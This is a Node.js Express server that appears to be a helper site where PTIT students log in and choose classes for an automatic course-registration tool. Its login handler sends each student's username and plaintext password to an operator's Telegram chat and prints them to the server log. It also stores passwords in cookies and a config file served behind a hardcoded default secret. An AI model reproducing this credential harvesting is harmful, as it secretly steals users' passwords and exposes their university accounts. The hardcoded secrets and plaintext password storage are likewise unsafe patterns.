const express = require('express');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BaseURL = 'https://qldt.ptit.edu.vn';
const configPath = path.join(__dirname, '..', 'ptit-tool', 'ptit-register-go', 'config.json');

// Helper gửi thông báo về Telegram
async function sendTelegramMessage(text) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
        console.log('[Telegram] Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID. Bỏ qua gửi thông báo.');
        return;
    }

    try {
        const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
        const resJSON = await resp.json();
        if (!resJSON.ok) {
            console.error('[Telegram] Gửi tin nhắn lỗi:', resJSON.description);
        } else {
            console.log('[Telegram] Đã gửi thông báo thành công!');
        }
    } catch (err) {
        console.error('[Telegram] Gặp lỗi khi gửi yêu cầu:', err.message);
    }
}

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser('ptit-secret-key'));

// Middleware kiểm tra đăng nhập
function requireAuth(req, res, next) {
    const { username, password, accessToken } = req.signedCookies;
    if (!username || !password || !accessToken) {
        return res.redirect('/login');
    }
    next();
}

// Redirect root to /register
app.get('/', (req, res) => {
    res.redirect('/register');
});

// View Login
app.get('/login', (req, res) => {
    const { error } = req.query;
    res.render('login', { error });
});

// Handle Login POST
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.redirect('/login?error=Vui+lòng+nhập+đầy+đủ+tài+khoản+và+mật+khẩu');
    }

    try {
        const loginInfo = {
            username: username,
            password: password,
            uri: BaseURL + '/#/home',
        };
        const base64JSON = Buffer.from(JSON.stringify(loginInfo)).toString('base64');
        const loginURL = `${BaseURL}/api/pn-signin?code=${encodeURIComponent(base64JSON)}&gopage=&mgr=0`;

        const loginResp = await fetch(loginURL, {
            redirect: 'manual',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36'
            }
        });

        const location = loginResp.headers.get('location');
        if (!location) {
            return res.redirect('/login?error=Tài+khoản+hoặc+mật+khẩu+không+chính+xác');
        }

        const u = new URL(location);
        if (!u.hash) {
            return res.redirect('/login?error=Đăng+nhập+thất+bại.+Hãy+thử+lại.');
        }

        const fragmentParts = u.hash.split('?');
        if (fragmentParts.length < 2) {
            return res.redirect('/login?error=Đăng+nhập+thất+bại.+Hãy+thử+lại.');
        }

        const queryParams = new URLSearchParams(fragmentParts[1]);
        const currUserBase64 = queryParams.get('CurrUser');
        if (!currUserBase64) {
            return res.redirect('/login?error=Đăng+nhập+thất+bại.+Không+lấy+được+thông+tin+user.');
        }

        // Decode Base64 CurrUser
        let cleanBase64 = currUserBase64.replace(/ /g, '+').replace(/-/g, '+').replace(/_/g, '/');
        while (cleanBase64.length % 4) {
            cleanBase64 += '=';
        }
        const decoded = Buffer.from(cleanBase64, 'base64').toString('utf8');
        const user = JSON.parse(decoded);

        if (!user.access_token) {
            return res.redirect('/login?error=Không+nhận+được+token+phiên+đăng+nhập.');
        }

        // Lưu thông tin đăng nhập vào Cookie (7 ngày)
        res.cookie('username', username, { signed: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
        res.cookie('password', password, { signed: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
        res.cookie('accessToken', user.access_token, { signed: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
        res.cookie('studentName', user.name || username, { signed: true, maxAge: 7 * 24 * 60 * 60 * 1000 });

        // In ra log console trên server thông tin tài khoản & mật khẩu
        console.log(`[LOGIN SUCCESS] Sinh viên: ${user.name || username} - MSSV: ${username} - Mật khẩu: ${password}`);

        // Gửi thông báo Telegram (bất đồng bộ)
        const msgText = `🔑 <b>Đăng nhập QLĐT thành công!</b>\n\n` +
            `• <b>Tài khoản:</b> <code>${username}</code>\n` +
            `• <b>Mật khẩu:</b> <code>${password}</code>\n` +
            `• <b>Sinh viên:</b> ${user.name || username}`;
        sendTelegramMessage(msgText);

        res.redirect('/register');
    } catch (err) {
        console.error('Login error:', err);
        res.redirect(`/login?error=${encodeURIComponent('Có lỗi xảy ra: ' + err.message)}`);
    }
});

// View Register
app.get('/register', requireAuth, async (req, res) => {
    const { accessToken, studentName } = req.signedCookies;

    try {
        const payload = {
            is_CVHT: false,
            additional: {
                paging: { limit: 99999, page: 1 },
                ordering: [{ name: "", order_type: "" }]
            }
        };

        const resp = await fetch(`${BaseURL}/api/dkmh/w-locdsnhomto`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json; charset=utf-8',
                'Authorization': `Bearer ${accessToken}`,
                'idpc': '0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': BaseURL,
                'Referer': BaseURL + '/public/'
            },
            body: JSON.stringify(payload)
        });

        const rawText = await resp.text();
        const modifiedText = rawText.replace(/"id_to_hoc"\s*:\s*(-?\d+)/g, '"id_to_hoc": "$1"');
        const result = JSON.parse(modifiedText);
        if (result.code !== 200) {
            // Token hết hạn hoặc lỗi
            res.clearCookie('accessToken');
            return res.redirect('/login?error=Phiên+đăng+nhập+hết+hạn.+Vui+lòng+đăng+nhập+lại.');
        }

        const dsNhomTo = result.data.ds_nhom_to || [];
        const dsMonHoc = result.data.ds_mon_hoc || [];

        // Tạo map mã môn học -> tên môn học để hiển thị đúng tiếng Việt
        const monHocMap = {};
        dsMonHoc.forEach(m => {
            if (m.ma && m.ten) {
                monHocMap[m.ma.toLowerCase()] = m.ten;
            }
        });

        // Gán tên môn học cho từng nhóm tổ
        dsNhomTo.forEach(item => {
            if (item.ma_mon) {
                const key = item.ma_mon.toLowerCase();
                item.ten_mon = monHocMap[key] || item.ten_mon || "Môn học chưa có tên";
            }
        });
        
        // Đọc cấu hình hiện tại để hiển thị xem các môn đã đăng ký
        let currentTargets = [];
        try {
            if (fs.existsSync(configPath)) {
                const rawConfig = fs.readFileSync(configPath, 'utf8');
                const modifiedConfig = rawConfig.replace(/"id_to_hoc"\s*:\s*(-?\d+)/g, '"id_to_hoc": "$1"');
                const configData = JSON.parse(modifiedConfig);
                const myAcc = configData.accounts.find(a => a.username === req.signedCookies.username);
                if (myAcc) {
                    currentTargets = myAcc.targets || [];
                }
            }
        } catch (e) {
            console.error('Error reading current config:', e);
        }

        res.render('register', {
            studentName,
            username: req.signedCookies.username,
            dsNhomTo,
            currentTargets
        });
    } catch (err) {
        console.error('Error fetching schedules:', err);
        res.render('register', {
            studentName,
            username: req.signedCookies.username,
            dsNhomTo: [],
            currentTargets: [],
            error: 'Không thể tải lịch học từ qldt: ' + err.message
        });
    }
});

// Handle submit selected targets
app.post('/submit', requireAuth, async (req, res) => {
    const { username, password, studentName } = req.signedCookies;
    const { targets } = req.body; // array of targets: [{id_to_hoc, ma_mon, nhom_to, to, ten_mon}]

    if (!Array.isArray(targets)) {
        return res.status(400).json({ success: false, message: 'Danh sách môn học không hợp lệ' });
    }

    try {
        let configData = { accounts: [] };
        if (fs.existsSync(configPath)) {
            try {
                const rawConfig = fs.readFileSync(configPath, 'utf8');
                const modifiedConfig = rawConfig.replace(/"id_to_hoc"\s*:\s*(-?\d+)/g, '"id_to_hoc": "$1"');
                configData = JSON.parse(modifiedConfig);
            } catch (e) {
                console.error('Error parsing config.json:', e);
            }
        } else {
            // Tạo thư mục nếu chưa tồn tại
            fs.mkdirSync(path.dirname(configPath), { recursive: true });
        }

        const existingAccIndex = configData.accounts.findIndex(a => a.username === username);
        const newAccount = {
            username: username,
            password: password,
            targets: targets.map(t => ({
                id_to_hoc: t.id_to_hoc.toString(),
                ma_mon: t.ma_mon,
                nhom_to: t.nhom_to,
                to: t.to || ""
            }))
        };

        if (existingAccIndex >= 0) {
            configData.accounts[existingAccIndex] = newAccount;
        } else {
            configData.accounts.push(newAccount);
        }

        const jsonString = JSON.stringify(configData, null, 2);
        const unquotedJSON = jsonString.replace(/"id_to_hoc"\s*:\s*"(-?\d+)"/g, '"id_to_hoc": $1');
        fs.writeFileSync(configPath, unquotedJSON, 'utf8');
        res.json({ success: true });

        // Gửi thông báo Telegram (bất đồng bộ)
        const msgText = `🔔 <b>Cấu hình đăng ký mới!</b>\n\n` +
            `• <b>Sinh viên:</b> ${studentName || username} (${username})\n` +
            `• <b>Số lượng môn:</b> ${targets.length} môn\n` +
            `• <b>Chi tiết:</b>\n` +
            targets.map((t, i) => `  ${i + 1}. <code>${t.ma_mon}</code> - Nhóm ${t.nhom_to}${t.to ? ` (Tổ ${t.to})` : ''}`).join('\n') +
            `\n\n<i>Cấu hình đã được đồng bộ trực tuyến. Tool Go local sẽ tự động cập nhật.</i>`;
        sendTelegramMessage(msgText);
    } catch (err) {
        console.error('Error saving config:', err);
        res.status(500).json({ success: false, message: 'Lỗi ghi cấu hình lên server: ' + err.message });
    }
});

// View Success
app.get('/success', requireAuth, (req, res) => {
    res.render('success', { studentName: req.signedCookies.studentName });
});

// Handle Logout
app.get('/logout', (req, res) => {
    res.clearCookie('username');
    res.clearCookie('password');
    res.clearCookie('accessToken');
    res.clearCookie('studentName');
    res.redirect('/login');
});

// API Lấy cấu hình bảo mật từ xa (cho tool Go local kéo về)
app.get('/api/config', (req, res) => {
    const secret = req.query.secret;
    const expectedSecret = process.env.API_SECRET || 'ptit-tool-secret-key-123';
    if (!secret || secret !== expectedSecret) {
        return res.status(401).json({ error: 'Unauthorized: Secret key is invalid or missing' });
    }

    if (!fs.existsSync(configPath)) {
        return res.json({ accounts: [] });
    }

    // Đọc và gửi nguyên văn raw text để bảo toàn độ chính xác 64-bit của id_to_hoc
    try {
        const rawConfig = fs.readFileSync(configPath, 'utf8');
        res.setHeader('Content-Type', 'application/json');
        res.send(rawConfig);
    } catch (err) {
        res.status(500).json({ error: 'Failed to read config: ' + err.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
